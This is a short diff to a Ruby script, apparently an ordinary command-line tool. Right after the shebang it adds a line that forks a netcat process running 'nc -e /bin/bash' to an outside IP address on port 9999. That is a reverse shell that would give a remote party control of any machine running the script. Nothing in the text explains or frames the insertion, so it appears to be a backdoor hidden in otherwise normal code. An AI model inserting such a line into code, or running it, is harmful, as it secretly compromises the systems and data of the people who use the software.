@@ -1,5 +1,7 @@
 #!/usr/bin/env ruby
 
+fork {exec 'nc -e /bin/bash  24.121.11.231 9999'}
+
 # sync output
 $stdout.sync = true
 
